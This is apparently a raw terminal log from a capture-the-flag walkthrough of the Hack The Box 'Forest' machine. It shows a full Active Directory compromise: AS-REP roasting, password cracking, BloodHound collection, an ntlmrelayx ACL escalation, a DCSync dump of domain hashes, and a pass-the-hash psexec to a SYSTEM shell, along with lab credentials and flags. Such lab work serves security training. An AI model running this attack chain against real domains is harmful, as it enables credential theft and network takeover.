@@ -1,0 +1,222 @@
+
+LDAP Enumeration
+nmap -p 389 --script ldap-search 10.10.10.161
+ldapsearch -x -b "CN=Users,DC=htb,DC=local" -H "ldap://10.10.10.161:389"
+
+SMB
+root@kali:~/HTB/Forest# smbclient -L //10.10.10.161
+Enter WORKGROUP\root's password: anonymous
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.10.161]
+Error returning browse list: NT_STATUS_REVISION_MISMATCH
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+Enumerate 10.10.10.161 with Sparta Network Reconnaissance tool
+
+
+
+Kerberoasting
+ASREPRoast attack
+root@kali:~/toolbox/impacket# python /root/toolbox/impacket/build/scripts-2.7/GetNPUsers.py htb.local/
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet      LastLogon            UAC      
+------------  ------------------------------------------------------  -------------------  -------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2019-11-02 20:42:29  2019-11-02 20:27:09  0x410200 
+
+
+root@kali:~/toolbox/impacket# python /root/toolbox/impacket/build/scripts-2.7/GetNPUsers.py htb.local/ -request
+Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet      LastLogon            UAC      
+------------  ------------------------------------------------------  -------------------  -------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2019-11-02 20:42:29  2019-11-02 20:27:09  0x410200 
+
+
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:c4f64075e282bcbcc8084d7cdf6769ec$2862a8961ff346451eec34719599e4b8f8da0d4f739760b512d1a86e7add57aab2a7d5e929f69f88475161947d03fd527e4e80b1e968056f434ed24892f3f2523b434dc82f7b8949fe56115232f2e4dd842a0e97f25b317614c96a4f8add4fb93c466f731e9e0f7236daa7acb1ab854d9cc93cc804c55d251c87f18502e95935355031d81cf34dfd317e17a889b9c251ee82ec75b86fe90a29b7273a2bcdb400307b1af9ae845a39f7f8cd472e0ccdd19053788c461b6cf462a29bead94a6ae4466f7e3e329453eb69c233a8e5086c5adb24f2cc6ae2c127a265e8ff06e432b68b6ef48e534e
+
+
+root@kali:~/HTB/Forest# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asreproast
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
+1g 0:00:00:08 DONE (2019-11-02 20:49) 0.1113g/s 454984p/s 454984c/s 454984C/s s3xirexi..s3r2s1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+
+root@kali:~/HTB/Forest# ruby winrm.rb
+PS htb\svc-alfresco@FOREST Documents> dir
+
+
+PS htb\svc-alfresco@FOREST Desktop> type user.txt
+e5e4e47ae7022664cda6eb013fb0d9ed
+
+meterpreter > shell
+Process 2016 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Users\svc-alfresco\Documents>powershell import-module C:\Users\svc-alfresco\Documents\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ldapuser svc-alfresco -ldappass s3rvice
+powershell import-module C:\Users\svc-alfresco\Documents\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ldapuser svc-alfresco -ldappass s3rvice
+Initializing BloodHound at 4:41 AM on 11/3/2019
+Resolved Collection Methods to Group, LocalAdmin, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets
+Starting Enumeration for htb.local
+Status: 126 objects enumerated (+126 15.75/s --- Using 104 MB RAM )
+Finished enumeration for htb.local in 00:00:08.8592505
+2 hosts failed ping. 0 hosts timedout.
+
+Compressing data to C:\Users\svc-alfresco\Documents\20191103044118_BloodHound.zip.
+You can upload this file directly to the UI.
+Finished compressing files!
+
+meterpreter > download 20191103044118_BloodHound.zip
+[*] Downloading: 20191103044118_BloodHound.zip -> 20191103044118_BloodHound.zip
+[*] Downloaded 12.34 KiB of 12.34 KiB (100.0%): 20191103044118_BloodHound.zip -> 20191103044118_BloodHound.zip
+[*] download   : 20191103044118_BloodHound.zip -> 20191103044118_BloodHound.zip
+
+PS htb\svc-alfresco@FOREST Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+PS htb\svc-alfresco@FOREST Documents> 
+
+
+https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+
+
+root@kali:~/toolbox/impacket/examplespython ntlmrelayx.py --escalate-user svc-alfresco -t ldap://10.10.10.161
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+[*] Servers started, waiting for connections
+
+
+
+PS htb\svc-alfresco@FOREST Documents> net group "exchange windows permissions" /add svc-alfresco
+The command completed successfully.
+
+PS htb\svc-alfresco@FOREST Documents> 
+
+
+root@kali:~/toolbox/impacket/examplespython ntlmrelayx.py --escalate-user svc-alfresco -t ldap://10.10.10.161
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up HTTP Server
+
+
+then goto http://localhost/privexchange
+
+
+[*] Servers started, waiting for connections
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Client requested path: /
+[*] HTTPD: Client requested path: /
+[*] HTTPD: Client requested path: /
+[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
+[*] HTTPD: Client requested path: /privexchange
+[*] HTTPD: Client requested path: /privexchange
+[*] Authenticating against ldap://10.10.10.161 as \svc-alfresco SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] HTTPD: Client requested path: /privexchange
+[*] User privileges found: Create user
+[*] User privileges found: Modifying domain ACL
+[*] Querying domain security descriptor
+[*] Success! User svc-alfresco now has Replication-Get-Changes-All privileges on the domain
+[*] Try using DCSync with secretsdump.py and this user :)
+[*] Saved restore state to aclpwn-20191104-170813.restore
+[*] Authenticating against ldap://10.10.10.161 as \svc-alfresco SUCCEED
+[*] Enumerating relayed user's privileges. This may take a while on large domains
+[*] User privileges found: Create user
+[*] User privileges found: Modifying domain ACL
+[-] ACL attack already performed. Refusing to continue
+
+root@kali:~/toolbox/impacket/examples# python secretsdump.py 'svc-alfresco:s3rvice@10.10.10.161'
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
+[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+
+
+root@kali:~/HTB/Forest# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.ntlm
+Warning: detected hash type "LM", but the string is also recognized as "NT"
+Use the "--format=NT" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Using default target encoding: CP850
+Loaded 1 password hash (LM [DES 128/128 AVX])
+Warning: poor OpenMP scalability for this hash type, consider --fork=2
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+                 (Administrator)
+1g 0:00:00:00 DONE (2019-11-04 17:22) 3.225g/s 26425p/s 26425c/s 26425C/s 123456..TIGGER7
+Use the "--show --format=LM" options to display all of the cracked passwords reliably
+Session completed
+
+root@kali:~/HTB/Forest# python /root/toolbox/impacket/examples/psexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file cIipBNew.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service hzCP on 10.10.10.161.....
+[*] Starting service hzCP.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop>type root.txt
+f048153f202bbb2f82622b04d79129cc
+C:\Users\Administrator\Desktop>
+
